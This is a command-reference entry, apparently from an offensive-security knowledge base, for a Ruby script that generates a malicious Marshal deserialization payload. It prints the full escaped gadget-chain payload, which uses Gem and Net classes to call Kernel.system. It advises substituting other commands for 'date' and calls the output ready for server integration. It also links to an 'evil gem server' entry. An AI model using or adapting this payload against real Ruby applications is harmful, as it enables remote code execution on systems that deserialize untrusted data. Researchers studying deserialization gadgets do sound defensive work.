---
data: ruby create_rce.rb
tags:
  - payload-generation
  - rce
type: command
output: >-
  "\\x04\\b\\[\\bc\\x15Gem::SpecFetcherc\\x13Gem::InstallerU:\\x15Gem::Requirement\\[\\x06o:\\x1CGem::Package::TarReader\\x06:\\b@ioo:\\x14Net::BufferedIO\\a;\\ao:#Gem::Package::TarReader::Entry\\a:\\n@readi\\x00:\\f@headerI\\\\\"\\baaa\\x06:\\x06ET:\\x12@debug_outputo:\\x16Net::WriteAdapter\\a:\\f@socketo:\\x14Gem::RequestSet\\a:\\n@setso;\\x0E\\a;\\x0Fm\\vKernel:\\x0F@method_id:\\vsystem:\\r@git_setI\\\\\"\\tdate\\x06;\\fT;\\x12:\\fresolve"
executor: bash
platforms:
  - Ruby
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:41.221Z'
id: f028a5c3-64ec-4aa8-9242-93a604b21b43
verified: false
validated: true
submitted: true
---
# ruby-create-rce-payload

## Command

```bash
ruby create_rce.rb
```

## Description

Executes a Ruby script to generate a malicious Marshal payload string for deserialization-based RCE, using a gadget chain that triggers Kernel.system('date').

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| create_rce.rb | The script file containing the gadget construction | Yes |

## Examples

### Basic Usage

```bash
ruby create_rce.rb
```

### Advanced Usage

Modify script for different commands, e.g., replace 'date' with other payloads.

## Expected Output

The escaped Marshal payload string, ready for server integration.

## Related

- [[commands/start-evil-gem-server]]
- [[procedures/Prepare-Malicious-Marshal-Payload-for-Ruby-Deserialization-RCE]]
